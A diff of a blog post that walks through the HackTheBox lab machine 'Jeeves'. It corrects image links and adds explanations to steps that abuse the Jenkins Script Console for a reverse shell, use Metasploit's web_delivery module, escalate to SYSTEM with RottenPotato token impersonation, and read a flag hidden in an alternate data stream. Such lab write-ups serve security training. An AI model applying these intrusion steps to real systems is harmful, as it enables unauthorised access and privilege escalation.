@@ -4,7 +4,7 @@ title: Hackthebox Jeeves Walkthrough
 categories: HackTheBox
 ---
 
-![placeholder](https://inar1.github.io/public/images/2019-09-15/jeeves-badge.png)
+![placeholder](https://inar1.github.io/public/images/2019-09-16/jeeves-badge.png)
 ## Explanation
 <a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has bunch of vulnerable machines in its own VPN.<br>
 This is a walkthrough of machine "Jeeves" on that website.<br>
@@ -107,21 +107,21 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 
 On port 50000, we can find Jenkins dashboard on "/askjeeves".<br>
 Besides, there is an interesting menu "Manage Jenkins".
-![placeholder](https://inar1.github.io/public/images/2019-09-15/jeeves-badge.png)
+![placeholder](https://inar1.github.io/public/images/2019-09-16/2019-09-15-13-08-21.png)
 
 After that, we can find a menu "Script Console".<br>
 This allows us to run any <a href="https://groovy-lang.org/">Groovy</a> script.
-![placeholder](https://inar1.github.io/public/images/2019-09-15/jeeves-badge.png)
+![placeholder](https://inar1.github.io/public/images/2019-09-16/2019-09-15-13-08-41.png)
 
-To get a reverse shell, we need to launch netcat and prepare a payload.<br>
+To get a reverse shell, we need to launch netcat and execute a payload.<br>
 We can find it from <a href="https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76">Github repository</a>.
 {% highlight shell %}
 root@kali:~# nc -nlvp 443
 listening on [any] 443 ...
 {% endhighlight %}
-![placeholder](https://inar1.github.io/public/images/2019-09-15/jeeves-badge.png)
+![placeholder](https://inar1.github.io/public/images/2019-09-16/2019-09-15-13-10-38.png)
 
-Now we got a reverse shell which is "" user.
+Now we got a reverse shell which is "kohsuke" user.
 {% highlight shell %}
 root@kali:~# nc -nlvp 443
 listening on [any] 443 ...
@@ -134,7 +134,7 @@ whoami
 jeeves\kohsuke
 {% endhighlight %}
 
-user.txt is in the directory "".
+user.txt is in the directory "C:\Users\kohsuke\Desktop".
 {% highlight shell %}
 C:\Users\kohsuke\Desktop>dir
 dir
@@ -156,8 +156,8 @@ e3232272596fb47950d59c4cf1e7066a
 
 ### 3. Getting Root
 
-We have reverse shell already.<br>
-For the further enumeration, gain meterpreter shell with Metasploit module "Web_delivery".
+For the further enumeration, gain meterpreter shell with Metasploit.<br>
+To achieve that purpose, we need to use Metasploit module "web_delivery" to generate a command. 
 {% highlight shell %}
 msf5 > use exploit/multi/script/web_delivery 
 
@@ -236,6 +236,7 @@ Resolving deltas: 100% (128/128), done.
 {% endhighlight %}
 
 Then, achieve a token for SYSTEM user with the following procedure.
+We need to load module <a href="https://www.offensive-security.com/metasploit-unleashed/fun-incognito/">incognito</a> for that.
 {% highlight shell %}
 meterpreter > upload /root/RottenPotato/rottenpotato.exe .
 [*] uploading  : /root/RottenPotato/rottenpotato.exe -> .
@@ -276,7 +277,7 @@ The flag is elsewhere.  Look deeper.
 {% endhighlight %}
 
 Sounds like there is nothing here.<br>
-However, by with "\R" option, we can find something interesting.
+However, by with "\R" option, we can find additional information.
 {% highlight shell %}
 meterpreter > shell
 Process 4384 created.
@@ -301,7 +302,8 @@ dir /R
                2 Dir(s)   7,474,098,176 bytes free
 {% endhighlight %}
 
-With "more" command, we can see the content.
+The file format means this is "Alternate Data Stream" which is almost like "metadata".<br>
+With "more" command, we can see the content with the redirection.
 {% highlight shell %}
 C:\Users\Administrator\Desktop>more < hm.txt:root.txt:$DATA
 more < hm.txt:root.txt:$DATA
